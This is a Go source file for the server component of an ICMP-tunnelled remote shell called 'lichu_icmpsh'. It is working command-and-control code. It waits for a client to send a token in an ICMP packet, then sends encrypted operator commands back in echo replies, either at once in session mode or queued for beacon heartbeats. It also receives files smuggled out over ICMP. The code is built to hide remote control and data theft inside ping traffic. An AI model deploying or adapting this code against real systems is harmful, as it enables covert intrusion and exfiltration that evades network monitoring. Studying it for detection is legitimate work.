// lichu_icmpsh/server/server.go
package server

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/routing"
	"lichu_icmpsh/common"
	"lichu_icmpsh/common/crypto"
	"os"
	"sync"
)

const (
	OutputFile         = "icmp_trans_file"
	DoneSignal         = "done"
	FixedPingHeaderLen = 8
	FixedPingFooterLen = 18
)

type Server struct {
	pcapListenHandle *pcap.Handle
	icmpId           uint16
	tokenCheck       bool
	receiveConnect   chan struct{}
	Mode             string
	commandQueue     []string
	queueMutex       sync.Mutex
	cryptor          crypto.Cryptor
	token            []byte
	common.Communicate
}

type ServerConfig struct {
	Token         []byte
	CryptoMode    string
	Mode          string
	Mtu           int
	FileTransMode bool
}

func NewServer(config ServerConfig) (*Server, error) {
	s := &Server{
		tokenCheck:     false,
		receiveConnect: make(chan struct{}, 1),
		Mode:           config.Mode,
		token:          config.Token,
		commandQueue:   make([]string, 0),
		Communicate:    common.Communicate{Mtu: config.Mtu},
	}

	// 文件传输模式下不加密
	if !config.FileTransMode {
		var err error
		s.cryptor, err = crypto.New(config.CryptoMode, config.Token)
		if err != nil {
			return nil, fmt.Errorf("创建加密器失败: %w", err)
		}
	}

	handle, err := pcap.OpenLive("any", 65536, false, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	s.pcapListenHandle = handle
	return s, nil
}

func (s *Server) ListenForFile() {
	fmt.Printf("[+] 目标存储文件: %s\n", OutputFile)
	fmt.Println("[+] 等待客户端连接并发送文件...")

	s.pcapListenHandle.SetBPFFilter("icmp")
	packetSource := gopacket.NewPacketSource(s.pcapListenHandle, s.pcapListenHandle.LinkType())

	var outputFile *os.File
	var err error
	var totalBytes int64 = 0

	defer func() {
		if outputFile != nil {
			outputFile.Close()
			fmt.Printf("\n[+] 文件 '%s' (大小: %s) 已成功接收。\n", OutputFile, formatBytes(totalBytes))
			fmt.Println("[+] 服务端退出。")
		}
	}()

	for packet := range packetSource.Packets() {
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer == nil {
			continue
		}
		icmpLayer := packet.Layer(layers.LayerTypeICMPv4)
		if icmpLayer == nil {
			continue
		}

		v, _ := icmpLayer.(*layers.ICMPv4)
		if !s.tokenCheck {
			if bytes.Compare(v.Payload, s.token) == 0 {
				fmt.Println("[+] 收到来自客户端的连接请求，身份验证成功。")
				s.tokenCheck = true

				outputFile, err = os.OpenFile(OutputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil {
					fmt.Printf("错误: 无法创建或打开文件 %s: %v\n", OutputFile, err)
					return
				}
				fmt.Print("[+] 开始接收文件数据: ")
			}
			continue
		}
		//传输结束信号
		if s.tokenCheck {
			if string(v.Payload) == DoneSignal {
				return
			}

			var fileData []byte
			payload := v.Payload
			if len(payload) == 56 {
				// 提取数据部分
				fileData = payload[FixedPingHeaderLen : len(payload)-FixedPingFooterLen]
			} else {
				fileData = payload
			}

			n, err := outputFile.Write(fileData)
			if err != nil {
				fmt.Printf("\n错误: 写入文件失败: %v\n", err)
				return
			}
			totalBytes += int64(n)
			fmt.Print("遇到凡事不要慌..")
		}
	}
}
func (s *Server) StartupShell() error {
	<-s.receiveConnect
	if s.Mode == "session" {
		fmt.Println("[+] 已建立实时会话 (Session Mode)。请输入指令:")
	} else {
		fmt.Println("[+] 客户端进入心跳模式 (Beacon Mode)。您输入的指令将被暂存，在下次心跳时下发。")
	}

	reader := bufio.NewScanner(os.Stdin)
	for reader.Scan() {
		command := reader.Text()
		if command == "" {
			continue
		}
		if s.Mode == "session" {
			commandEncrypt, err := s.cryptor.Encrypt([]byte(command))
			if err != nil {
				fmt.Printf("错误: 加密指令失败: %v\n", err)
				continue
			}
			err = s.SendICMP(commandEncrypt, s.icmpId, layers.ICMPv4TypeEchoReply)
			if err != nil {
				fmt.Printf("错误: 发送指令失败: %v\n", err)
			}
		} else {
			s.queueMutex.Lock()
			s.commandQueue = append(s.commandQueue, command)
			s.queueMutex.Unlock()
			fmt.Printf("[+] 指令 '%s' 已加入队列，等待下一次心跳。\n", command)
		}
	}
	return nil
}

func (s *Server) ListenICMP() {
	s.pcapListenHandle.SetBPFFilter("icmp")
	packetSource := gopacket.NewPacketSource(s.pcapListenHandle, s.pcapListenHandle.LinkType())

	for packet := range packetSource.Packets() {
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer == nil {
			continue
		}
		icmpLayer := packet.Layer(layers.LayerTypeICMPv4)
		if icmpLayer == nil {
			continue
		}

		ip, _ := ipLayer.(*layers.IPv4)
		v, _ := icmpLayer.(*layers.ICMPv4)

		if s.Src != nil && ip.SrcIP.Equal(s.Src) {
			continue
		}

		// 处理握手
		if !s.tokenCheck {
			if bytes.Compare(v.Payload, s.token) == 0 {
				fmt.Println("[+] 收到来自客户端的连接请求。")
				s.icmpId = v.Id
				s.Seq = v.Seq
				err := s.handleReceiveConnect(packet)
				if err != nil {
					fmt.Printf("错误: 处理连接失败: %v\n", err)
					continue
				}

				handshakeReplyPayload := []byte("HANDSHAKE_OK")
				err = s.SendICMP(handshakeReplyPayload, s.icmpId, layers.ICMPv4TypeEchoReply)
				if err != nil {
					fmt.Printf("错误: 发送握手回复失败: %v\n", err)
					continue
				}
				fmt.Println("[+] 握手回复已发送。")

				s.tokenCheck = true
				s.receiveConnect <- struct{}{}
			}
			continue
		}

		if s.tokenCheck {
			if !ip.SrcIP.Equal(s.Dst) || v.Id != s.icmpId {
				continue
			}

			decryptedPayload, err := s.cryptor.Decrypt(v.Payload)
			if err != nil {
				// 解密失败，可能来自其他机器的ping报文
				continue
			}

			if s.Mode == "beacon" && bytes.Compare(decryptedPayload, []byte("BEACON_REQUEST")) == 0 {
				s.handleBeaconRequest()
			} else {
				os.Stdout.Write(decryptedPayload)
			}

		}
	}
}

func (s *Server) handleBeaconRequest() {
	s.queueMutex.Lock()
	defer s.queueMutex.Unlock()

	var payloadToSend []byte
	var err error

	if len(s.commandQueue) > 0 {
		var commandsToRun bytes.Buffer
		for i, cmd := range s.commandQueue {
			commandsToRun.WriteString(cmd)
			if i < len(s.commandQueue)-1 {
				commandsToRun.WriteString("\n")
			}
		}

		queueLen := len(s.commandQueue)
		s.commandQueue = []string{}

		fmt.Printf("[+] 收到心跳, 下发 %d 条指令...\n", queueLen)
		payloadToSend, err = s.cryptor.Encrypt(commandsToRun.Bytes())
		if err != nil {
			fmt.Printf("错误: 加密指令队列失败: %v\n", err)
			return
		}
	} else {
		// 无指令时回复一个加密后的空包
		payloadToSend, _ = s.cryptor.Encrypt([]byte{})
	}

	err = s.SendICMP(payloadToSend, s.icmpId, layers.ICMPv4TypeEchoReply)
	if err != nil {
		fmt.Printf("错误: 发送心跳回复失败: %v\n", err)
	}
}

func (s *Server) handleReceiveConnect(packet gopacket.Packet) error {
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer == nil {
		return fmt.Errorf("无法在握手包中找到IP层")
	}
	ip, _ := ipLayer.(*layers.IPv4)
	s.Dst = ip.SrcIP

	router, err := routing.New()
	if err != nil {
		return err
	}

	iface, gw, src, err := router.Route(s.Dst)
	if err != nil {
		return err
	}

	s.Iface = iface
	s.Gateway = gw
	s.Src = src

	handle, err := pcap.OpenLive(iface.Name, 65536, false, pcap.BlockForever)
	if err != nil {
		return err
	}
	s.PcapSendHandle = handle

	hwAddr, err := s.GetHwAddr()
	if err != nil {
		return err
	}
	s.DstHwAddr = hwAddr
	return nil
}

func formatBytes(b int64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d Bytes", b)
	}
	div, exp := int64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
}
